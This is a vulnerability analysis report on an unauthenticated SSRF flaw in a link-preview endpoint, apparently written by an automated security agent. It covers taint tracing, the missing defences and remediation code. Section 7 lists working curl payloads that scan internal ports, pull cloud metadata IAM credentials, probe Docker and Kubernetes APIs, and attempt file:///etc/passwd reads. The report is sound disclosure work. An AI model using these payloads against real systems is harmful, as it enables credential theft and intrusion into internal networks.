# SSRF Vulnerability Analysis: /api/link-preview Endpoint

## Executive Summary

**Endpoint:** `/api/link-preview?url=<url>`
**Severity:** HIGH
**Verdict:** VULNERABLE
**Confidence:** High

The `/api/link-preview` endpoint contains a **Server-Side Request Forgery (SSRF)** vulnerability that allows attackers to make HTTP requests to arbitrary URLs, including internal network resources. While the endpoint implements protocol restrictions (HTTP/HTTPS only) and timeouts, it **lacks critical defenses** against internal IP addresses and cloud metadata endpoints.

---

## 1. HTTP Sink Identification

### HTTP Client Library
- **Library:** Native `fetch()` API (Node.js 18+ built-in)
- **Location:** `/repos/meshmonitor/src/server/routes/linkPreviewRoutes.ts:96`

### Sink Details
```typescript
// Line 96-103
const response = await fetch(url, {
  signal: controller.signal,
  headers: {
    'User-Agent': 'MeshMonitor-LinkPreview/1.0',
  },
  // Only fetch the first 50KB to avoid large downloads
  // @ts-ignore - TypeError is expected for size limit
});
```

**Critical Finding:** The `url` parameter is passed directly to `fetch()` after minimal validation.

---

## 2. Backward Taint Analysis: Source → Validations → Sink

### Data Flow

```
User Input (req.query.url)
    ↓
Line 61: Extract URL from query parameter
    ↓
Line 63-65: Type check (string validation)
    ↓
Line 70: URL() constructor validation
    ↓
Line 73-74: Protocol allowlist check (http: or https: only)
    ↓
Line 96: SINK - fetch(url)
```

### Source Code Analysis

```typescript
// SOURCE: Line 61
const { url } = req.query;

// VALIDATION 1: Type check (Lines 63-65)
if (!url || typeof url !== 'string') {
  return res.status(400).json({ error: 'URL parameter is required' });
}

// VALIDATION 2: URL format validation (Lines 68-78)
let validatedUrl: URL;
try {
  validatedUrl = new URL(url);

  // VALIDATION 3: Protocol allowlist (Lines 73-74)
  if (!['http:', 'https:'].includes(validatedUrl.protocol)) {
    return res.status(400).json({ error: 'Only HTTP and HTTPS URLs are supported' });
  }
} catch (error) {
  return res.status(400).json({ error: 'Invalid URL format' });
}

// SINK: Line 96 - User input reaches HTTP client
const response = await fetch(url, {
  signal: controller.signal,
  headers: {
    'User-Agent': 'MeshMonitor-LinkPreview/1.0',
  },
});
```

---

## 3. Defense Evaluation

### Present Defenses ✅

| Defense | Status | Location | Details |
|---------|--------|----------|---------|
| Protocol Allowlist | ✅ Implemented | Line 73-74 | Only allows `http:` and `https:` protocols |
| Timeout Control | ✅ Implemented | Line 93 | 5-second timeout via AbortController |
| URL Format Validation | ✅ Implemented | Line 70 | Uses URL() constructor for parsing |
| Response Size Limit | ⚠️ Partial | Line 101-102 | Comment indicates intent but not enforced |
| Content-Type Filtering | ✅ Implemented | Line 114 | Only processes text/html responses |

### Missing Critical Defenses ❌

| Defense | Status | Risk Level |
|---------|--------|------------|
| **Internal IP Blocking** | ❌ Missing | **CRITICAL** |
| **Cloud Metadata Blocking** | ❌ Missing | **CRITICAL** |
| **Port Restrictions** | ❌ Missing | **HIGH** |
| **Hostname Allowlist** | ❌ Missing | **MEDIUM** |
| **DNS Rebinding Protection** | ❌ Missing | **MEDIUM** |

#### Missing IP Range Blocks

The endpoint does **NOT** block access to:

- **Loopback:** `127.0.0.0/8`, `::1` (localhost)
- **Private IPv4:** `10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`
- **Link-Local:** `169.254.0.0/16`, `fe80::/10`
- **Cloud Metadata:** `169.254.169.254` (AWS/GCP/Azure metadata endpoint)
- **Private IPv6:** `fc00::/7`

---

## 4. Authentication & Authorization

### Access Control Analysis

**Middleware:** `optionalAuth()` (Line 59)

```typescript
router.get('/link-preview', optionalAuth(), async (req, res) => {
```

### Authentication Requirements

| Requirement | Status | Details |
|-------------|--------|---------|
| **Authentication Required** | ❌ NO | Uses `optionalAuth()` - allows anonymous access |
| **Permission Check** | ❌ NO | No permission validation |
| **Rate Limiting** | ⚠️ Unknown | Not visible in route file |

**Key Finding:** The `optionalAuth()` middleware allows **anonymous users** to access this endpoint. From `/repos/meshmonitor/src/server/auth/authMiddleware.ts:17-46`:

```typescript
export function optionalAuth() {
  return async (req: Request, _res: Response, next: NextFunction) => {
    try {
      if (req.session.userId) {
        const user = await databaseService.findUserByIdAsync(req.session.userId);
        if (user && user.isActive) {
          req.user = user;
        }
      }

      // If no authenticated user, attach anonymous user
      if (!req.user) {
        const anonymousUser = await databaseService.findUserByUsernameAsync('anonymous');
        if (anonymousUser && anonymousUser.isActive) {
          req.user = anonymousUser;
        }
      }

      next();
    } catch (error) {
      logger.error('Error in optionalAuth middleware:', error);
      next();
    }
  };
}
```

**Impact:** Any unauthenticated attacker can exploit this SSRF vulnerability.

---

## 5. Response Disclosure Analysis

### Non-Blind SSRF Characteristics

The endpoint returns **detailed response information** to the attacker:

```typescript
// Line 107-109: HTTP status code leaked
if (!response.ok) {
  logger.warn(`Failed to fetch URL: ${response.status} ${response.statusText}`);
  return res.status(response.status).json({ error: 'Failed to fetch URL' });
}

// Line 113: Content-Type header leaked
const contentType = response.headers.get('content-type') || '';

// Line 128-139: Full HTML content and parsed metadata returned
const html = await response.text();
const metadata = extractMetadata(html, url);
res.json(metadata);
```

**Leaked Information:**
1. HTTP status code (200, 404, 403, 500, etc.)
2. Content-Type header
3. Full HTML response body (for text/html)
4. Parsed metadata (title, description, images)
5. Response timing information (implicit)

**Classification:** This is a **non-blind SSRF** vulnerability, making it highly exploitable for:
- Internal network reconnaissance
- Service identification
- Port scanning
- Reading internal service responses

---

## 6. Vulnerability Verdict

### VULNERABLE - High Confidence

**Reasoning:**

1. ✅ **User input reaches HTTP sink** - URL parameter flows directly to `fetch()` with minimal sanitization
2. ❌ **No internal IP filtering** - Attacker can target `127.0.0.1`, `192.168.x.x`, `10.x.x.x`, `172.16.x.x`
3. ❌ **No cloud metadata blocking** - `169.254.169.254` is accessible
4. ❌ **No authentication required** - Anonymous access permitted via `optionalAuth()`
5. ✅ **Non-blind SSRF** - Full response disclosure aids exploitation
6. ⚠️ **Weak defenses** - Only protocol filtering and timeout present

### Severity Assessment

| Factor | Rating | Justification |
|--------|--------|---------------|
| Exploitability | HIGH | No authentication, simple payload, immediate feedback |
| Impact | HIGH | Access to internal services, cloud metadata, network scanning |
| Attack Complexity | LOW | Single HTTP request, no special tools required |
| Privileges Required | NONE | Anonymous access permitted |
| **Overall Severity** | **HIGH** | Meets criteria for high-severity vulnerability |

---

## 7. Exploit Techniques

### 7.1 Internal Network Scanning

**Technique:** Port scanning internal hosts

```bash
# Scan localhost ports
curl "https://meshmonitor.example.com/api/link-preview?url=http://127.0.0.1:8080"
curl "https://meshmonitor.example.com/api/link-preview?url=http://127.0.0.1:3306"  # MySQL
curl "https://meshmonitor.example.com/api/link-preview?url=http://127.0.0.1:6379"  # Redis
curl "https://meshmonitor.example.com/api/link-preview?url=http://127.0.0.1:5432"  # PostgreSQL

# Scan internal network
curl "https://meshmonitor.example.com/api/link-preview?url=http://192.168.1.1"      # Gateway
curl "https://meshmonitor.example.com/api/link-preview?url=http://10.0.0.5:8080"   # Internal service
```

**Expected Response:**
- **Service exists:** Returns HTML content or HTTP status
- **Service doesn't exist:** Timeout or connection refused error

### 7.2 Cloud Metadata Exfiltration

**Technique:** Access AWS/GCP/Azure instance metadata

```bash
# AWS EC2 Metadata (IMDSv1)
curl "https://meshmonitor.example.com/api/link-preview?url=http://169.254.169.254/latest/meta-data/"
curl "https://meshmonitor.example.com/api/link-preview?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"

# GCP Metadata
curl "https://meshmonitor.example.com/api/link-preview?url=http://169.254.169.254/computeMetadata/v1/instance/"

# Azure Metadata
curl "https://meshmonitor.example.com/api/link-preview?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01"
```

**Impact:** Exposure of:
- IAM credentials (AWS)
- Service account tokens (GCP)
- Access tokens (Azure)
- Instance configuration
- Network information

### 7.3 Internal Service Reconnaissance

**Technique:** Identify internal web applications

```bash
# Common internal admin panels
curl "https://meshmonitor.example.com/api/link-preview?url=http://192.168.1.1/admin"
curl "https://meshmonitor.example.com/api/link-preview?url=http://172.16.0.1:9000/"  # Portainer
curl "https://meshmonitor.example.com/api/link-preview?url=http://10.0.0.100:8080"   # Jenkins

# Container orchestration
curl "https://meshmonitor.example.com/api/link-preview?url=http://127.0.0.1:8001/"   # Kubernetes API
curl "https://meshmonitor.example.com/api/link-preview?url=http://172.17.0.1:2375/"  # Docker API
```

**Response Analysis:**
- HTTP 200 + HTML → Service identified
- HTTP 403/401 → Service exists but requires auth
- HTTP 404 → Service exists but path wrong
- Timeout → No service or firewall block

### 7.4 Reading Local Files (Protocol Bypass Attempt)

**Technique:** Attempt protocol bypass variations

```bash
# Standard file:// (should be blocked by protocol allowlist)
curl "https://meshmonitor.example.com/api/link-preview?url=file:///etc/passwd"

# Uppercase bypass attempt
curl "https://meshmonitor.example.com/api/link-preview?url=FILE:///etc/passwd"

# Mixed case
curl "https://meshmonitor.example.com/api/link-preview?url=FiLe:///etc/passwd"
```

**Expected Result:** Should be blocked by protocol allowlist at line 73-74. However, always verify edge cases.

### 7.5 Cache Poisoning

**Technique:** Exploit 24-hour cache (Lines 16, 51)

```bash
# First request - cache miss
curl "https://meshmonitor.example.com/api/link-preview?url=http://192.168.1.1/admin"

# Subsequent requests for 24 hours - cache hit
# Attacker gets free internal network probing without hitting rate limits
```

**Impact:**
- Cache enables sustained reconnaissance without repeated requests
- Bypasses potential rate limiting on fetch operations

---

## 8. Code References

### Key Locations

| Component | File Path | Line Numbers |
|-----------|-----------|--------------|
| **SSRF Sink** | `/repos/meshmonitor/src/server/routes/linkPreviewRoutes.ts` | 96 |
| **URL Parameter Extraction** | `/repos/meshmonitor/src/server/routes/linkPreviewRoutes.ts` | 61 |
| **Protocol Validation** | `/repos/meshmonitor/src/server/routes/linkPreviewRoutes.ts` | 73-74 |
| **Timeout Implementation** | `/repos/meshmonitor/src/server/routes/linkPreviewRoutes.ts` | 92-93 |
| **Response Processing** | `/repos/meshmonitor/src/server/routes/linkPreviewRoutes.ts` | 96-139 |
| **Authentication Middleware** | `/repos/meshmonitor/src/server/auth/authMiddleware.ts` | 17-46 |
| **Cache Implementation** | `/repos/meshmonitor/src/server/routes/linkPreviewRoutes.ts` | 26-52 |

---

## 9. Test Evidence

### Existing Tests

From `/repos/meshmonitor/src/server/routes/linkPreviewRoutes.test.ts`:

**Tests Present:**
- ✅ Missing URL parameter (Line 63-71)
- ✅ Invalid URL format (Line 73-81)
- ✅ Non-HTTP protocol rejection (Line 83-91) - Tests `ftp://` rejection
- ✅ Successful OpenGraph parsing (Line 93-112)
- ✅ Cache functionality (Line 114-163)

**Tests Missing:**
- ❌ Internal IP blocking (127.0.0.1, 192.168.x.x, 10.x.x.x)
- ❌ Cloud metadata endpoint blocking (169.254.169.254)
- ❌ Port restriction testing
- ❌ DNS rebinding protection

### Proof of Non-HTTP Protocol Protection

```typescript
// Line 83-91 from test file
it('returns 400 for non-HTTP protocols', async () => {
  const routes = await loadRoutes();
  const app = createApp();
  app.use('/api', routes);

  const response = await request(app).get('/api/link-preview?url=ftp://example.com');
  expect(response.status).toBe(400);
  expect(response.body.error).toBe('Only HTTP and HTTPS URLs are supported');
});
```

**Finding:** Protocol filtering is tested and working, but IP filtering is completely untested.

---

## 10. Risk Summary

### Attack Scenario

1. **Attacker Action:** Send GET request to `/api/link-preview?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/`
2. **Server Behavior:** Fetches cloud metadata endpoint
3. **Response:** Returns AWS IAM credentials in JSON metadata response
4. **Impact:** Full AWS account compromise

### Affected Assets

| Asset | Risk | Likelihood |
|-------|------|------------|
| **Cloud IAM Credentials** | Complete account takeover | HIGH (if running on AWS/GCP/Azure) |
| **Internal Services** | Unauthorized access, data exposure | HIGH |
| **Database Servers** | Data breach via internal MySQL/PostgreSQL | MEDIUM |
| **Container Orchestration** | Cluster compromise (K8s, Docker) | MEDIUM |
| **Internal APIs** | Unauthorized operations | HIGH |

---

## 11. Remediation Recommendations

### Priority 1: Immediate Actions (Critical)

#### A. Implement IP Address Allowlist/Blocklist

**Create IP validation utility:**

```typescript
// src/utils/network.ts (NEW FILE)
import { isIP } from 'net';

const PRIVATE_IP_RANGES = [
  // IPv4 Private Ranges
  { start: '10.0.0.0', end: '10.255.255.255' },           // RFC 1918
  { start: '172.16.0.0', end: '172.31.255.255' },         // RFC 1918
  { start: '192.168.0.0', end: '192.168.255.255' },       // RFC 1918
  { start: '127.0.0.0', end: '127.255.255.255' },         // Loopback
  { start: '169.254.0.0', end: '169.254.255.255' },       // Link-local & Cloud Metadata
  { start: '0.0.0.0', end: '0.255.255.255' },             // This network
  { start: '224.0.0.0', end: '255.255.255.255' },         // Multicast & Reserved
];

export function isPrivateIP(ip: string): boolean {
  const version = isIP(ip);
  if (version === 0) return true; // Invalid IP, block it

  if (version === 4) {
    // Check IPv4 private ranges
    const parts = ip.split('.').map(Number);
    const ipNum = (parts[0] << 24) + (parts[1] << 16) + (parts[2] << 8) + parts[3];

    for (const range of PRIVATE_IP_RANGES) {
      const startParts = range.start.split('.').map(Number);
      const endParts = range.end.split('.').map(Number);
      const startNum = (startParts[0] << 24) + (startParts[1] << 16) + (startParts[2] << 8) + startParts[3];
      const endNum = (endParts[0] << 24) + (endParts[1] << 16) + (endParts[2] << 8) + endParts[3];

      if (ipNum >= startNum && ipNum <= endNum) {
        return true;
      }
    }
  } else if (version === 6) {
    // Block IPv6 private ranges
    if (ip === '::1' || ip.startsWith('fc') || ip.startsWith('fd') || ip.startsWith('fe80:')) {
      return true;
    }
  }

  return false;
}

export async function validateUrl(url: string): Promise<{ valid: boolean; error?: string }> {
  try {
    const parsed = new URL(url);

    // Protocol check
    if (!['http:', 'https:'].includes(parsed.protocol)) {
      return { valid: false, error: 'Only HTTP and HTTPS protocols are allowed' };
    }

    // Check for IP-based URLs
    if (isPrivateIP(parsed.hostname)) {
      return { valid: false, error: 'Access to private IP addresses is not allowed' };
    }

    // DNS resolution check (resolve hostname to IP)
    const dns = await import('dns').then(m => m.promises);
    try {
      const addresses = await dns.resolve4(parsed.hostname);
      for (const ip of addresses) {
        if (isPrivateIP(ip)) {
          return { valid: false, error: 'URL resolves to a private IP address' };
        }
      }
    } catch (dnsError) {
      // If DNS fails, block the request
      return { valid: false, error: 'DNS resolution failed' };
    }

    return { valid: true };
  } catch (error) {
    return { valid: false, error: 'Invalid URL format' };
  }
}
```

**Update linkPreviewRoutes.ts:**

```typescript
import { validateUrl } from '../../utils/network.js';

// Replace lines 67-78 with:
const validation = await validateUrl(url);
if (!validation.valid) {
  return res.status(400).json({ error: validation.error });
}
```

#### B. Add Security Headers & Logging

```typescript
// Add audit logging for SSRF attempts
logger.warn(`⚠️ Link preview request: ${url} from IP: ${req.ip}`);

// Monitor for suspicious patterns
if (url.includes('169.254.169.254') || url.includes('metadata')) {
  logger.error(`🚨 SSRF attempt detected: ${url} from IP: ${req.ip}`);
  // Consider implementing automatic IP banning
}
```

### Priority 2: Defense in Depth (High)

1. **Require Authentication:** Change `optionalAuth()` to `requireAuth()`
2. **Add Rate Limiting:** Implement per-IP rate limiting (10 requests/minute)
3. **Port Restrictions:** Only allow ports 80 and 443
4. **DNS Rebinding Protection:** Re-validate DNS after initial resolution
5. **Response Size Enforcement:** Actually implement the 50KB limit mentioned in comments

### Priority 3: Monitoring & Detection (Medium)

1. **Add Audit Logging:** Log all link-preview requests with IP addresses
2. **Anomaly Detection:** Alert on high-frequency internal IP requests
3. **WAF Rules:** Deploy Web Application Firewall rules for common SSRF patterns

---

## 12. Related Vulnerabilities

**Other SSRF endpoints identified in codebase:**

From `/repos/meshmonitor/deliverables/code_analysis_deliverable.md`:

1. **Tile Server Test Endpoint** - `/api/tile-server/test` (CRITICAL - No auth, no IP filtering)
2. **Apprise Notification Service** - Webhook URLs (MEDIUM - Requires admin)
3. **HTTP Auto-Responder Triggers** - User-provided webhook URLs (HIGH - Authenticated)

**Recommendation:** Apply the same IP filtering remediation to all identified SSRF sinks.

---

## Appendix: Technical Details

### URL() Constructor Behavior

The `URL()` constructor at line 70 performs minimal validation:
- Checks URL syntax
- Parses protocol, hostname, port, path
- Does NOT perform DNS resolution
- Does NOT check IP addresses
- Does NOT validate against private IP ranges

### Fetch() API Security Model

Node.js `fetch()` API:
- Follows HTTP redirects by default (potential for redirect-based SSRF)
- No built-in SSRF protection
- No IP address filtering
- No protocol restrictions beyond what developer implements

### Cache Security Implications

24-hour cache (Line 16):
- Reduces repeated SSRF attempts
- BUT: Enables sustained reconnaissance with single request per target
- Cache key is the full URL string (Line 51)
- No cache purging mechanism for security incidents

---

**Report Generated:** 2026-02-24
**Analyst:** Security Analysis Agent
**Methodology:** White-box static analysis + backward taint tracking
